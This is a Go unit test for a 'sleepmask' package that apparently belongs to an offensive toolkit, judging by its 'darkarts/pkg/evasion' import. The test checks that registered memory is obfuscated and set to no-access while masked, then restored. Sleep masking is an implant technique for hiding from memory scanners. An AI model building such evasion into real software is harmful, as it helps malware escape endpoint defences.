//go:build windows && amd64

package sleepmask

import (
	"bytes"
	"testing"

	"darkarts/pkg/evasion"
)

func TestMaskRoundTrip(t *testing.T) {
	m, err := New()
	if err != nil {
		t.Fatal(err)
	}
	defer evasion.FreeVirtualMemory(evasion.CurrentProcess, m.keyPage)

	secret := []byte("sensitive-task-plaintext-0123456789")
	orig := append([]byte(nil), secret...)
	m.Register(secret)

	region, err := evasion.AllocateVirtualMemory(evasion.CurrentProcess, pageSz, pageRW)
	if err != nil {
		t.Fatal(err)
	}
	defer evasion.FreeVirtualMemory(evasion.CurrentProcess, region)
	marker := []byte("deadbeef-deadbeef-deadbeef-deadbeef")
	if err := evasion.WriteVirtualMemory(evasion.CurrentProcess, region, marker); err != nil {
		t.Fatal(err)
	}
	m.RegisterRegion(region, uintptr(len(marker)), pageRW)

	if err := m.Mask(); err != nil {
		t.Fatal(err)
	}
	if bytes.Equal(secret, orig) {
		t.Fatal("secret not obfuscated while masked")
	}

	old, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, region, uintptr(len(marker)), pageRW)
	if err != nil {
		t.Fatal(err)
	}
	if old != 0x01 {
		t.Fatalf("region protection while masked = 0x%X, want PAGE_NOACCESS", old)
	}

	if err := m.Unmask(); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(secret, orig) {
		t.Fatal("secret not restored after unmask")
	}

	if err := m.Mask(); err != nil {
		t.Fatal(err)
	}
	if err := m.Unmask(); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(secret, orig) {
		t.Fatal("secret drift after second cycle")
	}
}
